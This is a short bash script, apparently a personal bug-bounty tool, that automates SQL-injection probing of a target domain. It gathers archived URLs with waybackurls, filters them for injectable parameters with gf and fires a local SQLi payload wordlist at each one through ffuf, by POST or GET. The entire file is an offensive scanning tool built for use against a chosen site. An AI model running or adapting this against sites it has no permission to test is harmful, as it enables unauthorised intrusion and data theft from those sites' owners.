#!/bin/bash

#	SQLi:
#	Log file: active.SQLi.POST.log
#	Log file: active.SQLi.GET.log 

	if [ "$#" -ne 2 ] ; then
		echo "Usage: active.SQLi target.com [POST / GET]"
	
	elif [ "$2" = "POST" ] ;	then
	
		export HOST=$1

#		POST REQUEST:	ACTIVE PROBE = Higher results

		echo -e "\033[0;32mRunning\n"; waybackurls $HOST | uro | gf sqli | qsreplace "FUZZ" | while read url ; do ffuf -X POST -u "$url" -w $HOME/WORKZONE/payloads/SQLI.1 -c -ac -sa -t 40 -rate 11 -p 2 -od SQLi.ffuf.POST -d "FUZZ"; done

	elif [ "$2" = "GET" ] ; then
	
		export HOST=$1

#		GET REQUEST:	PASSIVE PROBE = Less results

		echo -e "\033[0;32mRunning\n"; waybackurls $HOST | uro | gf sqli | qsreplace "FUZZ"| while read url ; do ffuf -u "$url" -w $HOME/WORKZONE/payloads/SQLI.1 -c -ac -sa -t 40 -rate 11 -p 2 -od SQLi.ffuf.GET ; done		

	fi
	
#	--------------------------------------------------------------------------------------------------------------
#	--------------------------------------------------------------------------------------------------------------